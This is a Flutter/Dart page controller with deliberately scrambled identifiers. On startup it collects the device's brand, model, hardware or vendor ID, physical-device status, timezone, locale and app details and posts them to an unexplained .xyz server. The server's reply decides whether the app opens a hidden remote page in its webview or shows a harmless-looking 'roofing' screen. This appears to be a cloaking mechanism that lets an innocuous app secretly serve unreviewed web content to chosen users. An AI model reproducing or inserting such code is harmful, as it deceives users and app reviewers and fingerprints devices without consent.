import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var skygwqtp = RxBool(false);
  var iwqfcedp = RxBool(true);
  var xrue = RxString("");
  var santino = RxBool(false);
  var will = RxBool(true);
  final vzbhfla = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    rxlpat();
  }


  Future<void> rxlpat() async {

    santino.value = true;
    will.value = true;
    iwqfcedp.value = false;

    vzbhfla.post("https://pai.tellh662.xyz/D82E5bz0e79",data: await jerfow()).then((value) {
      var gcnhdsja = value.data["gcnhdsja"] as String;
      var wnkxo = value.data["wnkxo"] as bool;
      if (wnkxo) {
        xrue.value = gcnhdsja;
        green();
      } else {
        barton();
      }
    }).catchError((e) {
      iwqfcedp.value = true;
      will.value = true;
      santino.value = false;
    });
  }

  Future<Map<String, dynamic>> jerfow() async {
    final DeviceInfoPlugin ghfcey = DeviceInfoPlugin();
    PackageInfo chfra_xotq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var mtry = Platform.localeName;
    var cDjf = currentTimeZone;

    var OJzPp = chfra_xotq.packageName;
    var wajNfdP = chfra_xotq.version;
    var QNUos = chfra_xotq.buildNumber;

    var xBVQ = chfra_xotq.appName;
    var JPALj = "";
    var vivianKrajcik = "";
    var QaqdxCO  = "";
    var vAnFR = "";
    var arielleMurazik = "";
    var xavierWill = "";
    var immanuelCummings = "";
    var brandyLittel = "";


    var lXdN = "";
    var roRczs = false;

    if (GetPlatform.isAndroid) {
      lXdN = "android";
      var ivejtxpmwq = await ghfcey.androidInfo;

      vAnFR = ivejtxpmwq.brand;

      JPALj  = ivejtxpmwq.model;
      QaqdxCO = ivejtxpmwq.id;

      roRczs = ivejtxpmwq.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lXdN = "ios";
      var knjihqwpyt = await ghfcey.iosInfo;
      vAnFR = knjihqwpyt.name;
      JPALj = knjihqwpyt.model;

      QaqdxCO = knjihqwpyt.identifierForVendor ?? "";
      roRczs  = knjihqwpyt.isPhysicalDevice;
    }
    var res = {
      "QNUos": QNUos,
      "vAnFR": vAnFR,
      "wajNfdP": wajNfdP,
      "OJzPp": OJzPp,
      "xBVQ": xBVQ,
      "JPALj": JPALj,
      "cDjf": cDjf,
      "QaqdxCO": QaqdxCO,
      "immanuelCummings" : immanuelCummings,
      "mtry": mtry,
      "roRczs": roRczs,
      "arielleMurazik" : arielleMurazik,
      "brandyLittel" : brandyLittel,
      "lXdN": lXdN,
      "vivianKrajcik" : vivianKrajcik,
      "xavierWill" : xavierWill,

    };
    return res;
  }

  Future<void> barton() async {
    Get.offAllNamed("/roofing_tab");
  }

  Future<void> green() async {
    Get.offAllNamed("/roofing_build");
  }

}
